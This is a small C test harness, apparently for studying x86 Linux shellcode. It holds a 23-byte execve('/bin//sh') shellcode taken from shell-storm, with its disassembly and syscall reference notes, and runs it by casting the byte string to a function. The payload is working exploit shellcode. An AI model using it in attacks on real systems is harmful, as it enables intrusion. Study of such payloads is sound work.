#include <stdio.h>
#include <string.h>

/*
http://shell-storm.org/shellcode/files/shellcode-827.php

xor    %eax,%eax
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %eax
push   %ebx
mov    %esp,%ecx
mov    $0xb,%al
int    $0x80

--

https://blog.packagecloud.io/eng/2016/04/05/the-definitive-guide-to-linux-system-calls/
https://www.linuxjournal.com/article/4048
/../ %eax is the syscall number; %ebx, %ecx, %edx, %esi, %edi and %ebp are the six generic registers used as param0-5; and %esp cannot be used because it's overwritten by the kernel when it enters ring 0 (i.e., kernel mode) /../
https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux -> less /usr/include/asm/unistd_32.h

--

table: http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
x32: https://web.archive.org/web/20080820114521/http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html

*/

char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{
fprintf(stdout,"Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}
